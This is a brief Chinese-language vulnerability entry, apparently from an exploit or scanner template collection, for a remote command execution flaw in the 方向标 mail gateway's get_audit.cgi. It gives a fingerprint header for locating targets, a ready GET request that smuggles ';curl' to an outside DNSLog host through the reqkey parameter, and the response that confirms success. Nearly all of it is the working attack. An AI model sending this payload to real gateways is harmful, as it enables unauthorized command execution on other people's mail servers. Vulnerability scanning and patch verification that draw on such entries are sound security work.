# 方向标邮件网关get_audit.cgi存在远程命令执行漏洞

方向标邮件网关get_audit.cgi ｜ 命令执行 ｜ —
- **指纹**：`header="fm\_chk\_cookie\_ok"`
- **请求**：`GET /common/cgi/get\_audit.cgi?\_mode=get\_raw\_file\&reqkey=;`curl+lwdjdkcqdn.lfcx.eu.org` HTTP/1.1`
- **响应特征**：200 Dnslog回显